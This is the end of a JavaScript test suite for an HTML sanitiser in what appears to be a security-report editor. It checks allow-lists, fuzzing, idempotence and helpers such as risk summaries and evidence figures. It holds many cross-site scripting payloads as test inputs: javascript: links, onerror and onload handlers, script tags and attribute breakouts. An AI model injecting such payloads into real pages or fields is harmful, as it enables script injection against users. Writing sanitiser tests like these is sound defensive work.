"<a href = javascript:alert(1) >x</a>","<a href=javascript&#58;alert(1)>x</a>","<a href=\"javascript://%0aalert(1)\">x</a>","<a href=\"https://ok.test\" href=\"javascript:alert(1)\">x</a>","<a HREF=\"javascript:alert(1)\" href=\"https://ok.test\">x</a>"
]
const TAG_RE=/<\/?([a-zA-Z][^\s\/>]*)([^>]*)>/g
const ALLOWED_TAGS="p br h3 h4 strong b em i u s code pre blockquote ul ol li a table thead tbody tr th td hr img figure figcaption span".split(" ")
function audit(out){
// Every "<" in the output must start a whitelisted tag whose attributes are exactly the ones the subset allows.
let m,rest=out
TAG_RE.lastIndex=0
const problems=[]
const stripped=out.replace(TAG_RE,(all,name,attrs)=>{
if(ALLOWED_TAGS.indexOf(name)<0)problems.push("tag "+name)
const at=attrs.trim()
if(at){
if(all.charAt(1)==="/")problems.push("attrs on end tag")
const re=/([a-z\-]+)="([^"<>]*)"\s*/gy
let pos=0,am
re.lastIndex=0
while((am=re.exec(at))){
pos=re.lastIndex
const k=am[1],v=am[2]
const ok=(name==="a"&&k==="href"&&/^(https?:\/\/|mailto:)/i.test(v))||((name==="td"||name==="th")&&(k==="colspan"||k==="rowspan")&&/^\d+$/.test(v))||(name==="img"&&k==="src"&&/^rptasset:[A-Za-z0-9_.\-]+$/.test(v))||(name==="img"&&k==="alt")||(name==="img"&&k==="data-width"&&/^\d+%?$/.test(v))||(name==="figure"&&k==="class"&&v==="rpt-ev")||(name==="figure"&&k==="data-evidence"&&/^[A-Za-z0-9_.\-]+$/.test(v))||(name==="span"&&k==="class"&&v==="rpt-redact")||(name==="pre"&&k==="data-lang"&&/^[A-Za-z0-9_+#.\-]{1,32}$/.test(v))
if(!ok)problems.push("attr "+name+"."+k+"="+v)
}
if(pos!==at.length)problems.push("unparsed attrs: "+at)
}
return ""
})
if(/[<>]/.test(stripped))problems.push("stray angle bracket")
return problems
}
PAYLOADS.forEach((p,i)=>{
const out=S(p)
const problems=audit(out)
check("payload #"+i+" stays inside the subset",problems.length===0,JSON.stringify(p)+" => "+JSON.stringify(out)+" :: "+problems.join("; "))
check("payload #"+i+" idempotent",S(out)===out,JSON.stringify(out)+" => "+JSON.stringify(S(out)))
})
// Wrapped in allowed markup and concatenated, the payloads must still come out clean.
PAYLOADS.forEach((p,i)=>{
const out=S("<p>before "+p+" after</p><ul><li>"+p+"</li></ul><a href=\"https://ok.test\">"+p+"</a>")
check("payload #"+i+" wrapped stays inside the subset",audit(out).length===0,JSON.stringify(out))
})
check("all payloads concatenated",audit(S(PAYLOADS.join("\n"))).length===0)
// Deterministic pseudo-random fuzz: fragments glued in random order never leave the subset and never throw.
;(function(){
const FRAG=["<","</",">","/>","\"","'","=","`"," ","\n","\u0000","&","&#","&lt;","&#x3c;",";","script","svg","img","a","p","style","iframe","figure","span","td"," href=","javascript:","https://x.test"," onerror=","alert(1)"," src=","rptasset:u1"," class=","rpt-redact","rpt-ev","<!--","-->","<![CDATA[","]]>","text","<b>","</b>","<p>","<img src=\"rptasset:a\">"]
let seed=1234567
function rnd(n){seed=(seed*1103515245+12345)&0x7fffffff;return seed%n}
let bad=0,first=""
for(let r=0;r<4000;r++){
let s=""
const len=1+rnd(14)
for(let k=0;k<len;k++)s+=FRAG[rnd(FRAG.length)]
let out
try{out=S(s)}catch(e){bad++;if(!first)first="throw "+JSON.stringify(s);continue}
if(audit(out).length||S(out)!==out){bad++;if(!first)first=JSON.stringify(s)+" => "+JSON.stringify(out)}
}
check("fuzz: 4000 random fragment strings",bad===0,bad+" bad, first: "+first)
})()
// Pathological sizes must not blow the stack or hang.
;(function(){
const t=Date.now()
const deep=S("<b>".repeat(5000)+"x"+"</b>".repeat(5000))
check("deep nesting is capped",(deep.match(/<b>/g)||[]).length<=64&&deep.indexOf("x")>0)
S("<".repeat(200000))
S("<a href=\"".repeat(20000))
S("<svg>".repeat(20000))
S("&".repeat(200000))
check("pathological input finishes quickly",Date.now()-t<5000,(Date.now()-t)+"ms")
})()
eq("imgSrc hook maps a data URL",S("<img src=\"data:image/png;base64,AAAA\" alt=\"a\">",{imgSrc:(s)=>/^data:image\/png/.test(s)?"rptasset:tmp1":null}),"<img src=\"rptasset:tmp1\" alt=\"a\">")
eq("imgSrc hook cannot return another scheme",S("<img src=\"x\">",{imgSrc:()=>"javascript:alert(1)"}),"")
eq("imgSrc hook result is validated",S("<img src=\"x\">",{imgSrc:()=>"rptasset:a\" onerror=\"1"}),"")

// ---- riskSummary ----
eq("riskSummary empty",RC.riskSummary([]),{counts:{critical:0,high:0,medium:0,low:0,info:0},total:0,open:0,by_status:{open:0,retest:0,fixed:0,accepted:0},max:""})
eq("riskSummary null",RC.riskSummary(null).total,0)
const RS=RC.riskSummary([{severity:"high",status:"open"},{severity:"low",status:"fixed"},{severity:"high",status:"retest"},{severity:"bogus",status:"??"},{severity:"medium",status:"accepted"},null])
eq("riskSummary counts",RS.counts,{critical:0,high:2,medium:1,low:1,info:1})
eq("riskSummary total",RS.total,5)
eq("riskSummary open",RS.open,2)
eq("riskSummary by_status",RS.by_status,{open:2,retest:1,fixed:1,accepted:1})
eq("riskSummary max",RS.max,"high")
eq("riskSummary max critical",RC.riskSummary([{severity:"info"},{severity:"critical"},{severity:"low"}]).max,"critical")

// ---- findingNumber / fmtDate ----
eq("findingNumber first",RC.findingNumber("F-",0),"F-01")
eq("findingNumber tenth",RC.findingNumber("F-",9),"F-10")
eq("findingNumber hundredth",RC.findingNumber("VULN-",99),"VULN-100")
eq("findingNumber no prefix",RC.findingNumber(undefined,2),"03")
eq("findingNumber bad index",RC.findingNumber("F-","x"),"F-01")
eq("fmtDate date only",RC.fmtDate("2026-11-23"),"2026-11-23")
eq("fmtDate iso utc",RC.fmtDate("2026-11-23T10:12:45Z"),"2026-11-23 10:12")
eq("fmtDate iso offset",RC.fmtDate("2026-11-23T10:12:45+02:00"),"2026-11-23 08:12")
eq("fmtDate naive is utc",RC.fmtDate("2026-11-23 10:12:45"),"2026-11-23 10:12")
eq("fmtDate naive T is utc",RC.fmtDate("2026-11-23T10:12:45.123456"),"2026-11-23 10:12")
eq("fmtDate empty",RC.fmtDate(""),"")
eq("fmtDate null",RC.fmtDate(null),"")
eq("fmtDate garbage returned",RC.fmtDate("soon"),"soon")

// ---- evidenceFigureHtml ----
const EV={uid:"ev-1",kind:"command",title:"nmap",command:"nmap -sV 10.0.0.5",exit_code:0,started_at:"2026-11-23T10:12:00Z",content:"PORT   STATE\n22/tcp open <ssh> & \"more\"\n\n"}
eq("evidence figure (command)",RC.evidenceFigureHtml(EV),"<figure class=\"rpt-ev\" data-evidence=\"ev-1\"><figcaption>$ nmap -sV 10.0.0.5 \u2014 exit 0 \u2014 2026-11-23 10:12 UTC</figcaption><pre>PORT   STATE\n22/tcp open &lt;ssh&gt; &amp; &quot;more&quot;</pre></figure>")
eq("evidence figure strips ansi",RC.evidenceFigureHtml({uid:"e2",kind:"command",command:"ls",exit_code:1,content:"\u001b[1;31mred\u001b[0m\r\nok\u0007"}),"<figure class=\"rpt-ev\" data-evidence=\"e2\"><figcaption>$ ls \u2014 exit 1</figcaption><pre>red\nok</pre></figure>")
eq("evidence figure (image)",RC.evidenceFigureHtml({uid:"e3",kind:"image",title:"Login \"page\"",content:"",meta:{asset_uid:"as-9"},created_at:"2026-01-02T03:04:05Z"}),"<figure class=\"rpt-ev\" data-evidence=\"e3\"><figcaption>Login &quot;page&quot; \u2014 2026-01-02 03:04 UTC</figcaption><img src=\"rptasset:as-9\" alt=\"Login &quot;page&quot;\"></figure>")
eq("evidence figure (text, no exit)",RC.evidenceFigureHtml({uid:"e4",kind:"text",title:"Note",content:"hello"}),"<figure class=\"rpt-ev\" data-evidence=\"e4\"><figcaption>Note</figcaption><pre>hello</pre></figure>")
const HOSTILE=RC.evidenceFigureHtml({uid:"x\" onclick=\"alert(1)",kind:"command",command:"echo '</figcaption><script>alert(1)</script>'",exit_code:"0\"><img src=x onerror=alert(1)>",content:"</pre><img src=x onerror=alert(1)><script>alert(1)</script>",meta:{asset_uid:"a\"b"}})
check("evidence figure with hostile fields stays inside the subset",audit(HOSTILE).length===0,HOSTILE)
check("evidence figure with hostile uid drops the uid",HOSTILE.indexOf("data-evidence")<0,HOSTILE)
check("evidence figure escapes markup in output",HOSTILE.indexOf("&lt;script&gt;alert(1)&lt;/script&gt;")>0,HOSTILE)
check("evidence figure empty object",audit(RC.evidenceFigureHtml({})).length===0&&RC.evidenceFigureHtml({}).indexOf("<figure class=\"rpt-ev\">")===0)
check("evidence figure null",RC.evidenceFigureHtml(null).indexOf("<figure")===0)
check("evidence figure truncates huge output",RC.evidenceFigureHtml({uid:"big",content:"x".repeat(200000)}).length<70000)
// ---- code block language (pre[data-lang], a plain token of at most 32 characters) ----
;[
["<pre data-lang=\"bash\" class=\"note-code\" onclick=x style=\"y\">a</pre>","<pre data-lang=\"bash\">a</pre>"],
["<pre data-lang=' http '>a</pre>","<pre data-lang=\"http\">a</pre>"],
["<pre data-lang=\"&#98;ash\">a</pre>","<pre data-lang=\"bash\">a</pre>"],
["<pre data-lang=\"\">a</pre>","<pre>a</pre>"],
["<pre data-lang=\"two words\">a</pre>","<pre>a</pre>"],
["<pre data-lang=\"a&quot;onmouseover=alert(1)\">a</pre>","<pre>a</pre>"],
["<pre data-lang=\"x><script>alert(1)</script>\">a</pre>","<pre>a</pre>"],
["<pre data-lang=\""+"a".repeat(33)+"\">a</pre>","<pre>a</pre>"],
["<pre data-lang=\""+"a".repeat(32)+"\">a</pre>","<pre data-lang=\""+"a".repeat(32)+"\">a</pre>"],
["<pre DATA-LANG=json>{}</pre>","<pre data-lang=\"json\">{}</pre>"],
["<p data-lang=\"bash\">a</p><code data-lang=\"bash\">b</code>","<p>a</p><code>b</code>"]
].forEach((c)=>{eq("pre data-lang "+c[0].slice(0,40),S(c[0]),c[1]);check("pre data-lang audit "+c[0].slice(0,40),audit(S(c[0])).length===0,S(c[0]))})
eq("htmlToText",RC.htmlToText("<h3>T</h3><p>a &amp; b<br>c</p><ul><li>one</li><li>two</li></ul><script>x</script>"),"T\na & b\nc\none\ntwo")

// ---- subset v2: the Notes editor's structures (callouts, checklists, embeds, command figures, masked secrets, colour spans, widget markers)
const V2_TAGS=ALLOWED_TAGS.concat(["div"])
const V2_CLASS={figure:["rpt-ev","note-embed","rpt-cmd","note-embed-inline","note-embed-float-left","note-embed-float-right","note-align-center","note-align-right","note-sketch"],span:["rpt-redact","note-secret","note-ts","rpt-fref","rpt-ph"],div:["note-callout","note-finding","rpt-widget"],ul:["note-checklist"],table:["note-table","note-table-head","note-align-center","note-align-right"]}
const V2_ATTR={
a:{href:/^(https?:\/\/|mailto:)/i},
td:{colspan:/^\d+$/,rowspan:/^\d+$/,"data-width":/^\d{2,4}$/,"data-align":/^(center|right|justify)$/},
img:{src:/^rptasset:[A-Za-z0-9_.\-]+$/,alt:/^[^<>"]*$/,"data-width":/^\d{1,4}(%|px)?$/},
figure:{"data-evidence":/^[A-Za-z0-9_.\-]+$/,"data-kind":/^(image|sketch)$/,"data-asset":/^[A-Za-z0-9_\-]{6,64}$/,"data-shapes":/^[A-Za-z0-9_\-]+$/,"data-type":/^[A-Za-z0-9 ._+#\/()\-]{1,40}$/,"data-cat":/^[A-Za-z0-9 ._+#\/()\-]{1,80}$/,"data-sub":/^[A-Za-z0-9 ._+#\/()\-]{1,80}$/,"data-tags":/^[A-Za-z0-9 ._+#\/(),\-]{1,200}$/},
pre:{"data-lang":/^[A-Za-z0-9_+#.\-]{1,32}$/},
span:{"data-finding":/^[A-Za-z0-9_\-]{1,64}$/,"data-token":/^[a-z_]{1,40}$/,"data-color":/^#[0-9a-f]{6}$/,"data-bg":/^#[0-9a-f]{6}$/,"data-size":/^\d{1,2}$/},
div:{"data-callout":/^(finding|vuln|info|warning|credential|evidence)$/,"data-sev":/^(critical|high|medium|low|info)$/,"data-cvss":/^(10\.0|\d\.\d)$/,"data-widget":/^(risk_matrix|severity_summary|findings_table|commands_run)$/},
ol:{start:/^\d{1,4}$/},li:{"data-checked":/^1$/,"data-align":/^(center|right|justify)$/},
p:{"data-align":/^(center|right|justify)$/},blockquote:{"data-align":/^(center|right|justify)$/},
h3:{"data-align":/^(center|right|justify)$/,"data-collapsed":/^1$/},h4:{"data-align":/^(center|right|justify)$/,"data-collapsed":/^1$/}
}
V2_ATTR.th=V2_ATTR.td
// Strict allow-list check of sanitiser output: tags, attribute names per tag, class tokens per tag, value patterns. No style / id / on* can pass.
function audit2(out){
const problems=[]
const stripped=out.replace(/<(\/?)([a-zA-Z0-9]+)((?:\s+[a-z\-]+="[^"<>]*")*)>/g,(all,close,name,attrs)=>{
if(V2_TAGS.indexOf(name)<0)problems.push("tag "+name)
if(close&&attrs.trim())problems.push("attrs on end tag")
attrs.replace(/\s+([a-z\-]+)="([^"<>]*)"/g,(m,k,v)=>{
if(k==="class"){
const ok=V2_CLASS[name]||[]
v.split(" ").forEach((c)=>{if(ok.indexOf(c)<0)problems.push("class "+name+"."+c)})
}else{
const rx=(V2_ATTR[name]||{})[k]
if(!rx||!rx.test(v))problems.push("attr "+name+"."+k+"="+v)
}
return ""
})
return ""
})
if(/[<>]/.test(stripped))problems.push("stray angle bracket")
return problems
}
;[
'<div class="note-callout" data-callout="finding" data-sev="high" data-cvss="8.1"><h3 data-collapsed="1">T</h3><p data-align="center">x</p></div>',
'<div class="note-callout note-finding" data-callout="vuln" data-sev="low"><p>x</p></div>',
'<div class="note-callout" data-callout="credential"><p><b>Secret: </b><span class="note-secret">P@ss</span></p></div>',
'<ul class="note-checklist"><li data-checked="1">done</li><li>open</li></ul><ol start="5"><li>x</li></ol>',
'<table class="note-table note-table-head note-align-center"><tbody><tr><th data-width="120">k</th><td data-align="right">v</td></tr></tbody></table>',
'<figure class="note-embed note-embed-float-left note-sketch" data-kind="sketch" data-asset="abcdef123456" data-shapes="eyJ2IjoxfQ-_"><img src="rptasset:abcdef123456" alt="Drawing" data-width="420px"></figure>',
'<figure class="rpt-cmd" data-type="Linux Shell" data-cat="Recon" data-sub="Ports (TCP)" data-tags="nmap, scan"><figcaption>Full scan</figcaption><p>All ports</p><pre>nmap -p- 10.0.0.5</pre></figure>',
'<p><span class="note-ts">[2026-11-23 10:12]</span> <span class="rpt-fref" data-finding="ab12cd">F-03 SQL injection</span> <span class="rpt-ph" data-token="client">{{client}}</span></p>',
'<p><span data-color="#ff0000" data-bg="#fff3bf" data-size="18">x</span></p>',
'<div class="rpt-widget" data-widget="risk_matrix"></div><div class="rpt-widget" data-widget="commands_run"></div>'
].forEach((h,i)=>{eq("v2 structure survives #"+i,S(h),h);check("v2 structure audit #"+i,audit2(S(h)).length===0,audit2(S(h)).join("; "))})
;[
['<div class="note-callout evil" data-callout="x" data-sev="high" data-cvss="9" style="position:fixed" onclick="a()"><p>x</p></div>','<div class="note-callout" data-callout="info"><p>x</p></div>'],
['<div class="note-callout" data-callout="Vulnerability" data-sev="extreme" data-cvss="10">x</div>','<div class="note-callout" data-callout="vuln" data-cvss="10.0">x</div>'],
['<div class="note-callout" data-callout="finding" data-cvss="11">x</div>','<div class="note-callout" data-callout="finding">x</div>'],
['<div class="app-modal-backdrop">plain</div>','plain'],
['<span data-color="#FF0000" data-bg="url(x)" data-size="999">a</span><span data-color="red" style="color:red">b</span>','<span data-color="#ff0000">a</span>b'],
['<span class="rpt-fref" data-finding="a b&quot;x">a</span><span class="rpt-ph" data-token="Client;">b</span>','<span class="rpt-fref">a</span><span class="rpt-ph">b</span>'],
['<span class="note-secret revealed notes-popover" data-x="1">s</span>','<span class="note-secret">s</span>'],
['<ul class="x"><li data-checked="0" data-align="left">a</li></ul><ol start="0"><li>b</li></ol><table class="evil"><tr><td data-width="5" data-align="top">c</td></tr></table>','<ul><li>a</li></ul><ol><li>b</li></ol><table><tr><td>c</td></tr></table>'],
['<figure class="note-embed app-x" data-kind="file" data-asset="../x" data-shapes="a b" contenteditable="false" draggable="true"><img src="rptasset:abcdef123456" style="width:9px"></figure>','<figure class="note-embed"><img src="rptasset:abcdef123456"></figure>'],
['<figure class="rpt-cmd" data-type="&lt;img&gt;" data-cat="a&quot;b" data-tags="x&#10;y"><pre>x</pre></figure>','<figure class="rpt-cmd"><pre>x</pre></figure>'],
['<div class="rpt-widget" data-widget="findings_table"><p>x</p><div>y</div><script>alert(1)</script></div>after','<div class="rpt-widget" data-widget="findings_table"></div>after'],
['<div class="rpt-widget" data-widget="evil"><p>x</p></div>after','after'],
['<span class="note-secret">a<span>b</span>c</span>','<span class="note-secret">abc</span>'],
['<span class="rpt-redact">a<span class="x">b</span>c</span>d','<span class="rpt-redact">abc</span>d'],
['<div class="note-callout"><div>a</div><p>b</p></div>','<div class="note-callout" data-callout="info">a<p>b</p></div>'],
['<a>x<a href="https://x.test">y</a></a>','x<a href="https://x.test">y</a>'],
['<p>a<div class="note-callout" data-callout="info"><p>b</p></div>','<p>a</p><div class="note-callout" data-callout="info"><p>b</p></div>'],
['<h3 data-collapsed="yes" data-align="CENTER" id="x">t</h3><li data-checked="TRUE">y</li>','<h3 data-align="center">t</h3><li data-checked="1">y</li>']
].forEach((c,i)=>{eq("v2 validation #"+i,S(c[0]),c[1]);check("v2 validation audit #"+i,audit2(S(c[0])).length===0,audit2(S(c[0])).join("; "));eq("v2 validation idempotent #"+i,S(S(c[0])),S(c[0]))})
;[
'<div class="note-callout" data-callout="finding&quot; onmouseover=&quot;alert(1)">x</div>',
'<div class="note-callout" data-callout=finding onmouseover=alert(1) style=background:url(javascript:alert(1))>x</div>',
'<span class="rpt-ph" data-token="x&quot;><script>alert(1)</script>">y</span>',
'<figure class="note-embed" data-shapes="&quot;><img src=x onerror=alert(1)>">z</figure>',
'<figure class="note-embed" data-asset="x&#34; onload=&#34;alert(1)"><img src="rptasset:u1" onerror=alert(1)></figure>',
'<span data-color="#fff&quot; style=&quot;background:url(javascript:alert(1))">c</span>',
'<span data-color="#ffffff" data-bg="expression(alert(1))" data-size="12;alert(1)">c</span>',
'<td data-width="100&quot; onclick=&quot;x" data-align="center&#x22; onfocus=&#x22;x">d</td>',
'<div class="rpt-widget" data-widget="risk_matrix&quot;><svg onload=alert(1)>"></div>',
'<div class="rpt-widget" data-widget="risk_matrix"><div><div></div><img src=x onerror=alert(1)></div><script>alert(1)</script></div><img src=x onerror=alert(1)>',
'<div class="rpt-widget" data-widget="risk_matrix"><script></div><img src=x onerror=alert(1)></script>',
'<ul class="note-checklist&quot; onfocus=&quot;x"><li data-checked="1&quot; onclick=&quot;x">e</li></ul>',
'<ol start="1&quot; onclick=&quot;x"><li>a</li></ol>',
'<figure class="rpt-cmd" data-type="x&quot; onclick=&quot;alert(1)" data-tags="a,b&quot;><script>alert(1)</script>"><figcaption><img src=x onerror=alert(1)></figcaption></figure>',
'<div class="note-callout" data-cvss="7.5&quot; onclick=&quot;x" data-sev="high&#x20;onclick=x">t</div>',
'<div class=note-callout data-callout=info><div class=rpt-widget data-widget=risk_matrix><div class=note-callout onclick=alert(1)>x</div></div><span class=rpt-fref data-finding=javascript:alert(1)>y</span></div>',
'<span class="rpt-fref" data-finding="ok" contenteditable="false" onclick="alert(1)" id="notesPopover">f</span>',
'<div class="note-callout confirm-overlay app-modal-backdrop notes-ed-overlay" id="appModalBackdrop">cover</div>'
].forEach((p,i)=>{
const out=S(p)
check("v2 payload #"+i+" stays inside the subset",audit2(out).length===0,audit2(out).join("; ")+"  <=  "+out)
check("v2 payload #"+i+" has no handler / script / style",!/<script|<svg|<img(?![^>]*src="rptasset:)|\son[a-z]+\s*=|style\s*=|javascript:/i.test(out.replace(/>[^<]*</g,"><")),out)
eq("v2 payload #"+i+" idempotent",S(out),out)
})
PAYLOADS.forEach((p,i)=>{
const out=S('<div class="note-callout" data-callout="finding"><span class="note-secret">'+p+'</span><ul class="note-checklist"><li data-checked="1">'+p+'</li></ul></div>')
check("payload #"+i+" inside v2 structures",audit2(out).length===0,audit2(out).join("; "))
})
const FRAG2=["<","</",">","/>","\"","'","=","`"," ","\n","&","&#","&lt;","&#x3c;",";","script","svg","img","a","p","figure","span","td"," href=","javascript:","https://x.test"," onerror=","alert(1)"," src=","rptasset:u1"," class=","rpt-redact","rpt-ev","<!--","-->","div"," data-callout=","finding"," data-sev=","high"," data-cvss=","9.8","note-callout","note-secret","rpt-widget"," data-widget=","risk_matrix","rpt-fref"," data-finding=","rpt-ph"," data-token=","client"," data-color=","#ff0000"," data-bg="," data-size=","12","ul","li"," data-checked=","1","note-checklist","note-embed"," data-shapes=","eyJ2"," data-asset=","abcdef12","rpt-cmd"," data-type=","table","note-table"," data-width="," data-align=","center","ol"," start="," style=","</div>","</span>"]
let seed2=7654321
function rnd2(n){seed2=(seed2*1103515245+12345)&0x7fffffff;return seed2%n}
let bad2=0,first2=""
for(let r=0;r<6000;r++){
let s2=""
const len=1+rnd2(16)
for(let k=0;k<len;k++)s2+=FRAG2[rnd2(FRAG2.length)]
let out
try{out=S(s2)}catch(e){bad2++;if(!first2)first2="throw "+JSON.stringify(s2);continue}
if(audit2(out).length||S(out)!==out){bad2++;if(!first2)first2=JSON.stringify(s2)+" => "+JSON.stringify(out)+" :: "+audit2(out).join("; ")}
}
check("v2 fuzz: 6000 random fragment strings",bad2===0,bad2+" bad, first: "+first2)
check("v2 deep nesting is bounded",S("<div class=note-callout>".repeat(500)+"x").split("<div").length-1<=64)
console.log("")
console.log(passed+" passed, "+failed+" failed")
process.exit(failed?1:0)
